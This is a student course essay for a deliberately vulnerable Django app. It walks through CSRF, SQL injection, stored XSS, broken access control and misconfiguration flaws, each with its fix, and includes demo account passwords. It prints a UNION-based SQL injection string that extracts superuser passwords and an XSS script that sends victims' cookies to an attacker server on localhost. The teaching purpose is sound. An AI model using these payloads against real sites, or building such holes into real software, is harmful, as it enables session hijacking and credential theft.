# Cyber Security Base 2024, project I

Repository: [https://github.com/Pekk4/csb-project1](https://github.com/Pekk4/csb-project1)

# IMPORTANT NOTE!
Adding .env file was missing from the original essay's instructions (the one submitted to course page) and it's needed to run main branch version of the application!

### Installation 

Clone repository, open working directory and activate python virtual environment with:

```bash
git clone https://github.com/Pekk4/csb-project1
cd csb-project1/
python3 -m venv venv
```

Then install project's dependencies:

```bash
pip install -r requirements.txt
```

Next set .env file, run Django's migrations and then you can start the server:

```bash
cd project/
mv .env.example .env # Add secret key into the .env file, it can be generated e.g. by running 'openssl rand -base64 32' (without quotes)
python3 manage.py migrate
python3 manage.py runserver
```

Attacker server in attacker/ works with the same virtualenv, so activate it in another terminal and then start it in the same way.

#### Pre-configured users 
If you want to use pre-configured users (in the main app, attacker server does not need users), run 

```bash
python3 manage.py loaddata users.json
```

before starting the server. It contains following users:

```
dumbledore:*l-~Phi=y,e^s.!x9Tio (Administrator account)
bob:dylan666
alice:cooper666
testuser1 (for testing deleting functionality)
testuser2 (for testing deleting functionality)
testuser3 (for testing deleting functionality)
```

## OWASP List

OWASP list used in project: https://owasp.org/www-project-top-ten/2017/Top_10 (2017)


## FLAW 1: CSRF

### Link(s) to the flaw occurrence in code:

 - Link 1: https://github.com/Pekk4/csb-project1/blob/962e7268f2a91e03db28ae00baf846b8c7c42fe5/project/project/settings.py#L47
 - Link 2: https://github.com/Pekk4/csb-project1/blob/962e7268f2a91e03db28ae00baf846b8c7c42fe5/project/vulnerableApp/views.py#L23
 - Link 3: https://github.com/Pekk4/csb-project1/blob/962e7268f2a91e03db28ae00baf846b8c7c42fe5/project/vulnerableApp/templates/main.html#L16

### Description

My first flaw is a Cross Site Request Forgery, CSRF. As it is also said on the course page, it is not very common anymore and thus not even on the OWASP's list.
Anyway, I chosed it because it was funny to try it myself. According to course page and OWASP's CSRF-page, many modern frameworks has a built-in protection for
CSRF and for example with Django, one must make an effort to get the Django app vulnerable for CSRF attacks, as it has the built-in protection for that.

In a successful CSRF attack, an attacker is able to execute such an actions in the target web application that the victims privileges are sufficient for.
This is possible for example by tricking the victim to open a malicious web page while they have an active session open to the target system. That malicious page
may have for example a hidden image tag, which has it's source URL set to target system so it makes the GET request when page is loaded.
I implemented my CSRF attack so that the victim is tricked to open a malicious page and when user clicks the button (of course they do, who could resist cute kittens??),
a message has been sent to the target system on behalf of the victim. The attack can be found from project's [attacker/](./attacker/) directory.
Victim gets and URL to `http://localhost:9000` and when victim clicks that tempting button, the message will be sent.

### Fixes

In Django the CSRF flaw can be implemented for example either by disabling a CSRF middleware (link 1), or using "@csrf_exempt" decorator with a view method (link 2), which disables it
from a spesific view. Forgetting "{% csrf_token %}" (link 3) from html templates is not sufficient alone, but it needs also the CSRF middleware be disabled, otherwise the app just crashes.

Anyway, fixes can be seen here (same rows but in main branch):

 - https://github.com/Pekk4/csb-project1/blob/96fd8a7523dc7226e773b930f6408a2a114a1633/project/project/settings.py#L47
 - https://github.com/Pekk4/csb-project1/blob/96fd8a7523dc7226e773b930f6408a2a114a1633/project/vulnerableApp/views.py#L22
 - https://github.com/Pekk4/csb-project1/blob/96fd8a7523dc7226e773b930f6408a2a114a1633/project/vulnerableApp/templates/main.html#L16

CSRF middleware is in use, the decorator is missing and the token is added in template's form.


## FLAW 2: Injection

### Link(s) to the flaw occurrence in code:

- Link 1: https://github.com/Pekk4/csb-project1/blob/c951828c258dc9c5ad4aa1db1b22c665dce7b9ce/project/vulnerableApp/views.py#L42

### Description

Another flaw I chose is SQL injection, where attacker is able to get unauthorized access to data by injecting malicious SQL queries as a part of the application's
original SQL queries for example via application's input forms. These inputs are not sanitized and usually they are directly part of the original SQL query, when it is possible to arbitrarily
to manipulate the query in a way that attacker wants. I my Django app the scenario is just like this; there is a form in main.html where is `<select>` element listing application's users.
There are usernames as options and every option has user's id as a value. This id is used directly in that view method's SQL query (link 1) and if attacker changes that value, the value is
handled as a part of the query. Attacker opens their browser's developer tools and just changes that value to 

```
666' UNION SELECT password,username FROM auth_user WHERE is_superuser=1 -- 
```

and then submits the form, and as a result they will get every superuser's password listed instead of wanted user's messages, which is the original purpose of that form.

### Fixes

As with CSRF, modern frameworks have helped with SQL injections as well. Many frameworks does have a built-in support for Object-Relational Mappings, ORMs, which handles at least the most basic
SQL queries in a correct way, so developers does not need to write their own queries. Anyhow, it is not always the case but sometimes custom queries are needed. Then the correct way to
prevent SQL injections to happen is to use parameterized SQL queries (or prepared statements, which is pretty similar), where the variables are given to a used SQL driver as a parameter and
that driver takes care of for example escaping the quotes from the inputs so that they can't alter the original query when joined into it.

 - https://github.com/Pekk4/csb-project1/blob/064f72946d3ae241fec4aaf4c2fd479b7c275d2b/project/vulnerableApp/views.py#L43
 - https://github.com/Pekk4/csb-project1/blob/064f72946d3ae241fec4aaf4c2fd479b7c275d2b/project/vulnerableApp/views.py#L27 (Example of using ORM instead of custom query)
<br />
<br />
<br />
(At this point I realized that I may have written too much text and thus from now on I will focus more on my application-specific things.)
<br />
<br />
<br />

## FLAW 3: XSS

### Link(s) to the flaw occurrence in code:

 - Link 1: https://github.com/Pekk4/csb-project1/blob/c2d233967f38b2849b7d76ad1d62d0af512fbc3d/project/vulnerableApp/templates/xssmessages.html#L1

### Description

In the application there is a link in main page which directs user to the page, where they can see all of the messages in the application. Application has had a little careless developer
who has forgot to turn templates autoescaping back on after testing something with it off (link 1). Now that page is vulnerable to Cross-Site Scripting attacks and the attacker has noticed this.
The attacker has sent a message

```
<script>window.location.href = "http://localhost:9000/xss?"+document.cookie;</script>
```

into the application and now that vulnerable page directs users to attacker's server (found from project's attacker/ directory) which stoles their sessions and cookies and
then sends messages with their privileges in the app. This kind of XSS where it is stored in and then fetched from the persistent storage (database), is called as stored XSS (or persistent XSS).

### Fixes

Once again a flaw which Django has built-in protection against and one needs to make an effort to get this flaw into their Django app. Anyway, removing autoescape off from the templates
prevents application to be vulnerable for XSS attacks, as with autoescaping Django sanitizes all the content rendered in templates and thus the malicious JavaScript will not be run when
the page is loaded.

 - https://github.com/Pekk4/csb-project1/blob/aec735730bcf4cb9ff5e592f52b81356b73604b1/project/vulnerableApp/templates/xssmessages.html#L1


## FLAW 4: Broken Access Control

### Link(s) to the flaw occurrence in code:

 - Link 1: https://github.com/Pekk4/csb-project1/blob/04abc5fbb3b01c641719b2520aa3e167bdb4d1c3/project/vulnerableApp/views.py#L58
 - Link 2: https://github.com/Pekk4/csb-project1/blob/04abc5fbb3b01c641719b2520aa3e167bdb4d1c3/project/vulnerableApp/views.py#L64

### Description

Once again the developer has been a little careless while implementing some admin functionalities into the application. Now there is a page in path /adminview to see application's
users and it has also an option to delete them. Unfortunately everyone could reach that page if they just know or guess the correct URL and nothing checks if the user is admin or not.

### Fixes

Fortunately this is a easy flaw to fix, as it is sufficient to check that the user has admin privileges and thus is allowed to delete users. Django has a built-in method for that,
which returns a boolean value depending on the user's status.

 - https://github.com/Pekk4/csb-project1/blob/7380c485a0fa0d882dafe78e9f8b7f710a5ba9a0/project/vulnerableApp/views.py#L59
 - https://github.com/Pekk4/csb-project1/blob/7380c485a0fa0d882dafe78e9f8b7f710a5ba9a0/project/vulnerableApp/views.py#L68


## FLAW 5: Security Misconfiguration (and Insufficient Logging & Monitoring)

### Link(s) to the flaw occurrence in code:

 - Link 1: https://github.com/Pekk4/csb-project1/blob/ffbb8c844989a7dc2cbbc35823341d3a4925d23c/project/project/settings.py#L23
 - Link 2: https://github.com/Pekk4/csb-project1/blob/ffbb8c844989a7dc2cbbc35823341d3a4925d23c/project/project/settings.py#L26
 - Link 3: https://github.com/Pekk4/csb-project1/blob/ffbb8c844989a7dc2cbbc35823341d3a4925d23c/project/project/settings.py#L126
 - Link 4: https://github.com/Pekk4/csb-project1/blob/fcbb6cdf66ca1acc594262eb998582fefbedb704/project/users.json#L9

### Description

These configurations causes a Security Misconfiguration flaw. For example link 1 has a hardcoded value, which is publicly available in a public repository and thus an attacker
can exploit it to guess session tokens and passwords, as Django uses it when encrypting those. Link 2 allows an attacker to cause intentional errors on application and then gather
information about the system via error messages and stack traces. Link 3 satisfies also Insufficient Logging & Monitoring flaw, as it causes logging to be disabled and then 
administrators can't see what is going on, for example DDOS attacks or brute-force logins. Link 4 indicates that there is "admin" account in use, which is very easy to guess and if
(when) password is also "admin", attacker gets admin access quite easily.

### Fixes

Hardcoded secret moved into .env file which is added into .gitignore as well, so that kind of secrets does not end up into public repository. Debug logging is set to false, so
users will not see any error messages, if errors encountered. Basic logging level in Django is pretty good, so it is enough to comment out or delete that disable logging and
basic "admin" account is deleted and admin privileges has given to the more "normal" user (the name could be better, as dumbledore is probably a part of dictionary attacks wordlists).
(Users passwords are visible (encrypted, but still) in repository which is a very bad thing, but in this case the users.json is only for helping peer reviewers to use the app :D)

 - https://github.com/Pekk4/csb-project1/blob/a7d1a9ceb5715a8eb55adb7eaecca9f61e302c7e/project/project/settings.py#L26
 - (https://github.com/Pekk4/csb-project1/blob/d1aa00cf631bbbd41c9554326d2b1d68bc7d3066/.gitignore#L6)
 - https://github.com/Pekk4/csb-project1/blob/a7d1a9ceb5715a8eb55adb7eaecca9f61e302c7e/project/project/settings.py#L29
 - https://github.com/Pekk4/csb-project1/blob/a7d1a9ceb5715a8eb55adb7eaecca9f61e302c7e/project/project/settings.py#L129
 - https://github.com/Pekk4/csb-project1/blob/0abf00905ab85add65a640385f63bd5b32d0428e/project/users.json#L98

## References
 - Course material
 - https://owasp.org/www-community/attacks/csrf
 - https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
 - https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)
 - https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
 - https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration
 - https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring

  I'm quite familiar with these topics and used refs mainly for checking the definitions.
